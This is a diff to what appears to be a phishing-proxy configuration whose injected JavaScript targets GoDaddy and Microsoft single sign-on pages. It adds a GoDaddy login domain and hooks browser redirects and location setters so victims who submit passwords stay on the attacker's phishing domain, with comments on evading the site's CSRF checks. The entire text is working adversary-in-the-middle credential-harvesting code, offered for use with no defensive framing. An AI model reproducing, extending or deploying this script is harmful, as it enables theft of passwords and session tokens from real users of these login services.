@@ -308,7 +308,7 @@ js_inject:
   # If sub_filters miss either (compression, dynamic strings), this rewrites
   # them to our proxy at runtime so the user lands on /common/SAS/ProcessAuth
   # under woman.<phish_domain> instead of the real Microsoft.
-  - trigger_domains: ["sso.secureserver.net", "sso2.secureserver.net"]
+  - trigger_domains: ["sso.secureserver.net", "sso2.secureserver.net", "sso.godaddy.com"]
     trigger_paths: ["/*", "/"]
     script: |
       (function() {
@@ -352,7 +352,10 @@ js_inject:
         var _mo = new MutationObserver(_patchForms);
         try { _mo.observe(document.documentElement, {childList: true, subtree: true, attributes: true, attributeFilter:['action']}); } catch(e) {}
 
-        // Hook window.location assignments / .assign() / .replace() / .href setter
+        // Hook window.location.assign/.replace — catches JS-driven redirects
+        // after the password POST (this was escaping the proxy when missing).
+        // Intentionally NOT hooking fetch/XHR.open — those break GoDaddy's
+        // login-form AJAX submission and trigger CSRF rejection ("Yikes").
         try {
           var _origAssign  = window.location.assign.bind(window.location);
           var _origReplace = window.location.replace.bind(window.location);
@@ -360,19 +363,18 @@ js_inject:
           window.location.replace = function(u) { return _origReplace(_rewrite(u)); };
         } catch(e) {}
 
-        // Hook fetch + XHR open in case JS posts SAMLResponse via AJAX
+        // Hook direct location.href / location = '...' assignments via setter
         try {
-          var _of = window.fetch;
-          window.fetch = function(input, init) {
-            if (typeof input === 'string') input = _rewrite(input);
-            else if (input && input.url) { try { input = new Request(_rewrite(input.url), input); } catch(e) {} }
-            return _of.call(this, input, init);
-          };
-          var _ox = XMLHttpRequest.prototype.open;
-          XMLHttpRequest.prototype.open = function(m, u) {
-            arguments[1] = _rewrite(u);
-            return _ox.apply(this, arguments);
-          };
+          var _proto = Object.getPrototypeOf(window.location) || Location.prototype;
+          var _hrefDesc = Object.getOwnPropertyDescriptor(_proto, 'href');
+          if (_hrefDesc && _hrefDesc.set) {
+            var _origHrefSet = _hrefDesc.set;
+            Object.defineProperty(window.location, 'href', {
+              configurable: true,
+              get: _hrefDesc.get,
+              set: function(v) { return _origHrefSet.call(this, _rewrite(v)); }
+            });
+          }
         } catch(e) {}
       })();
 
